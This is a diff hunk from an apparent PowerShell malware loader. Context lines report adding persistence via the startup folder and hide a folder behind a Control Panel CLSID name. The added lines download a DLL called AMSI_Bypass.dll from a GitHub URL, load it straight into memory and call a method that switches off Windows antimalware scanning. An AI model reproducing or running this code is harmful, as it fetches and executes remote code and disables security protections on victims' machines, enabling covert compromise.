@@ -40,8 +40,10 @@ Write-Host "[!] Persistence Added" -ForegroundColor Green
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
 
-
-
+$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/AMSI_Bypass.dll"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+[Bypass]::amsi()
 
 $rdir = "C:\Users\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
